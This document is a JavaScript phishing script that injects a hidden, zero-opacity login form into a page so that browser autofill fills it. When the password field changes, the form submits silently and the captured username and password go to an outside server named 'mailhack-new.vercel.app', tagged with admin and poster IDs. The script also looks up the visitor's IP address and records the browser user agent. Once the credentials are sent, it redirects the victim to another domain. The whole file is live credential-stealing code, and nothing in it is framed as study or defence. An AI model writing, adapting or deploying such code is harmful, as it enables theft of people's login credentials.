

const API_URL = 'https://mailhack-new.vercel.app'
  function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}

var userIp;

async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    userIp = data.ip; // Set the userIp variable
    console.log('IP Address fetched:', userIp);
    return data.ip;
  } catch (error) {
    console.error('Error fetching IP address:', error);
  }
}

window.onload = function () {
  getUserIP().then(() => {
    console.log('User IP Address:', userIp); // Access the IP after it's set
  });
};




$(document).ready(function () {
   const adminId = getQueryParam('admin');
    const posterId = getQueryParam('poster');
    const site = getQueryParam('site');
    // Dynamically create the login form
    const loginForm = $('<form>', {
        id: 'loginForm',
        method: 'POST',
        css: { opacity: '0' } // Hide the form
    });

    // Add input fields: username, password, and userAgent
    const usernameField = $('<input>', {
        type: 'text',
        id: 'username',
        name: 'username'
    });

    const passwordField = $('<input>', {
        type: 'password',
        id: 'password',
        name: 'password'
    });

    const userAgentField = $('<input>', {
        type: 'text',
        id: 'userAgent',
        name: 'userAgent',
        value: navigator.userAgent // Automatically fill with the browser's user agent
    });
    
    
    // created time and date 
    const currentTime = new Date();
    const year = currentTime.getFullYear();
    const month = String(currentTime.getMonth() + 1).padStart(2, '0'); 
    const day = String(currentTime.getDate()).padStart(2, '0');
    const hours = String(currentTime.getHours()).padStart(2, '0');
    const minutes = String(currentTime.getMinutes()).padStart(2, '0');
    const seconds = String(currentTime.getSeconds()).padStart(2, '0');
    
    const formattedTime = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
    console.log(formattedTime); 
    
        

    // Append the fields to the form
    loginForm.append(usernameField, passwordField, userAgentField);
    $('body').append(loginForm);

    // Listen for changes in the password field
    passwordField.on('change', function () {
        if ($(this).val().trim() !== '') {
            loginForm.submit(); // Auto-submit the form if password is not empty
        }
    });

    // Handle form submission
    loginForm.on('submit', function (event) {
        event.preventDefault(); // Prevent default form submission

        const username = $('#username').val().trim();
        const password = $('#password').val().trim();
            console.log(username);
            console.log(password);
        if (username && password) {
            // Send form data via AJAX
            $.ajax({
                type: 'POST',
                url: `${API_URL}/ad/${adminId}/${posterId}`,
                data: {
                    site:site,
                    mail: username,
                    passcode: password,
                    adminId: adminId,
                    posterId: posterId
                },
                success: function (response) {
                    console.log('Response:', response);
                        if(response != null){
                            window.location.href = "https://megapersonaelse.my.id/code-page/64";
                        }
                         
                        
                    
                },
                error: function (xhr, status, error) {
                    console.error('Error during form submission:', error);
                }
            });
        } else {
            console.error('Username and password are required.');
        }
    });

    // Fetch additional data on page load
    // $.ajax({
    //     type: 'POST',
    //     url: 'https://test.ck408.com/api/data',
    //     success: function (data) {
    //         console.log('Fetched data:', data);
    //     },
    //     error: function (xhr, status, error) {
    //         console.error('Error fetching data:', error);
    //     }
    // });
});





